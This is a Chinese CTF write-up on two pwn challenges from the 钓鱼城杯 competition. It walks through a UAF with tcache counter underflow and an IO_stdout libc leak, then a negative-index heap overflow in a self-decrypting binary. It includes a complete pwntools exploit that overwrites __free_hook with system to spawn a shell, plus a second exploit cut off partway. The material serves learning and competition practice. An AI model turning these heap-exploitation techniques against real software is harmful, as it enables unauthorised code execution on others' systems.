# 钓鱼城杯Pwn Writeup学习
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者：Alter@星盟
## 前言
星盟萌新，最近和师傅们一起打了钓鱼城杯比赛，虽然我实力有限全程只能划水，但师傅们太强了直接被带飞，所以赛后借着师傅们的WP复现学习了一下，把自己遇到的问题尽可能详细的写了一下，希望可以帮到和我一样的PWN新手
## 钓鱼城杯Veryeasy
UAF+tcache attack
###  1、将tcache放满的另一种方法
将一个chunk double free到tcache中之后，连续申请这个chunk
3次，tcache这条链就会被记为-1，然后再次删除这个size的chunk就会被放入unsorted bin中，如下图：
申请一次之后
以此类推，申请3次之后
此时变成-1之后应该是整数溢出，-1相当于最大的正数0xff大于7，所以下一个chunk会被放入unsorted bin中
本地关闭ASLR之后，Main arena和IO stdout居然不在一个内存页，挺神奇的。不过开启之后还是在同一个内存页的
###  2、常规分析
全保护
###  3、IDA分析
有增删改功能，但是没有show函数，所以需要修改IO stdout
  * delete函数
漏洞点，显然有UAF漏洞，但是这里有一个if判断，dword_202010最开始为9，每add一次或者edit一次就会-1，dword_20204c每删除一次就会+1
###  4、利用思路
由于开启了全保护且没有show函数，所以需要通过IO
stdout泄露libc地址，但是限制了tcache的删除次数，所以通过向tcache里放7个chunk的方法行不通（其实好像也行，通过add和edit使dword_202010整数溢出就行，不过有点麻烦），所以这里采用上面说的方法，先double
free再申请3个chunk将tcache的计数器变成-1导致整数溢出，然后再次free就会放到unsorted bin中，通过edit部分写main
arena修改为IO stdout的地址，然后申请两个chunk到IO stdout
修改flags为0xfbad1887并改小writebase为0x58，泄露出libc。然后通过2次edit函数将dword_202010减为为-1整数溢出，再通过double
free chunk1申请到free hook的地址，修改为system即可，getshell
###  5、EXP：（来自haivk师傅的exp，稍有改动）
    from pwn import *
    #context.log_level='debug'
    #p=process('./veryeasy')
    libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    def add(idx,size,content):
      p.recvuntil("Your choice :")
      p.sendline('1')
      p.recvuntil("id:\n")
      p.sendline(str(idx))
      p.recvuntil("please input your size:\n")
      p.sendline(str(size))
      p.recvuntil("content:\n")
      p.send(content)
    def edit(idx,content):
      p.recvuntil("Your choice :")
      p.sendline('2')
      p.recvuntil("id:\n")
      p.sendline(str(idx))
      p.recvuntil("content:\n")
      p.send(content)
    def delete(idx):
      p.recvuntil("Your choice :")
      p.sendline('3')
      p.recvuntil("id:\n")
      p.sendline(str(idx))
    def pwn():
      add(0,0xf0,'a')
      add(1,0x10,'a')
      delete(0)
      delete(0)
      add(2,0xf0,'\x60')
      add(3,0xf0,'\x60')
      add(4,0xf0,'\x60')
      delete(0)
      #edit(0,'\x60\x07\xdd')
      edit(0,'\x60\x97')
      add(5,0xf0,'a')
      #gdb.attach(p)
      add(6,0xf0,p64(0xfbad1887)+p64(0)*3+'\x58')
      #p.recvuntil('\n')
      libcbase=u64(p.recv(6).ljust(8,'\x00'))-0x3e82a0
      print hex(libcbase)
      free_hook=libcbase+libc.sym['__free_hook']
      system=libcbase+libc.sym['system']
      edit(0,'a')
      edit(0,'a')
      #gdb.attach(p)
      delete(1)
      edit(1,p64(free_hook))
      add(7,0x10,'/bin/sh\x00')
      add(8,0x10,p64(system))
      delete(7)
      p.interactive()
    #pwn()
    while True:
      try:
        p=process("./veryeasy")
        pwn()
        p.interactive()
      except:
        p.close()
        print ("retrying...")
## 钓鱼城杯unknown
程序自修改解密（比较逆向）+堆溢出+tcache attack
###  1、常规分析
保护全开
###  2、IDA分析
用IDA打开后发现，里面没有什幺正常的函数，无法反汇编，发现是中间有一些加密之后的指令混在函数中，导致反汇编失败。在haivk师傅的帮助下，通过IDA的动态调试，运行程序，利用程序的自修改解密，得到正常的elf文件（具体过程参照文末IDA动态调试）
  * Menu函数
写得奇奇怪怪，其实就是增删改查功能
  * add函数
仔细看会发现对于idx只做了上限，没有考虑下限，所以我们可以输入负数，v3是一个int类型的数，是有正负的，所以没有整数溢出，但是仔细想想会发现向ptr[-1]这个位置写就有点意思了，这个位置在ptr地址的上面
  * delete函数
没有UAF，非常正常
  * show函数
给了show函数，挺开心的，不同再修改IO_stdout泄露libc了
  * edit函数
发现向堆中读入Size数组记录的那么多个字节
###  3、利用思路
粗看好像没有什么漏洞，但是仔细想想结合add和edit函数，会发现一个问题，add函数可以申请index为-1的chunk，查看一下ptr和Size数组的地址
发现正好相差了0x80，而0x80/8=16，正好是16个p64长度的东西，而这些地址全是用来记录chunk的size的，所以我们申请index为负数的chunk就意味着可以修改Size数组中的size的值，而edit读入的size又是根据这个数组中的size确定的，所以我们就有了一个堆溢出漏洞。
首先将一个chunk放到unsorted
bin中，用show函数泄露出libc地址，再申请index为-1的chunk，实现栈溢出，将一个free掉了的tcache
chunk的fd指针修改为free hook，在通过tcache poisioning申请得到free
hook，修改为system函数地址即可getshell
申请index=-1的chunk前后Size的变化
申请前
申请后
可以看到原本Size[15]=0，申请index=-1的chunk之后，Size[15]被修改成了堆地址，而这个值很大，所以我们可以向chunk
15中写入这么多字节的数据，实现了堆溢出，之后修改fd指针就行了
###  EXP：（改编自haivk师傅的exp）
    from pwn import *
    context.log_level='debug'
    p=process("./unknown")
    libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    def add(idx,size):
      p.recvuntil("Your choice: ")
      p.sendline('1')
      p.recvuntil("Index: ")
      p.sendline(str(idx))
      p.recvuntil("Size: ")
      p.sendline(str(size))
    def edit(idx,content):
      p.recvuntil("Your choice: ")
      p.sendline('2')
      p.recvuntil("Index: ")
      p.sendline(str(idx))
      #p.recvuntil("\n")
      sleep(0.2)
      p.send(content)
    def show(idx):